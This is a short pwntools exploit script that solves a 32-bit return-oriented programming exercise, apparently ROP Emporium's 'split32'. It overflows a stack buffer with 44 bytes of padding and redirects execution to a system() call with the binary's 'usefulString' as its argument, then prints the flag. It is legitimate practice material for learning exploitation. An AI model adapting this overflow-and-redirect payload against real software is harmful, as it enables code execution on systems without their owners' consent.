#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
e = ELF("./split32")

STRING = e.symbols['usefulString']
SYSTEME = 0x08048657
PADDING = "A"*44
PAYLOAD = PADDING + p32(SYSTEME) + p32(STRING)

p = process(['./split32'])
msg = p.recv(timeout=0.1)
print msg

p.sendline(PAYLOAD)
msg = p.recvuntil('}')
print msg

p.close()
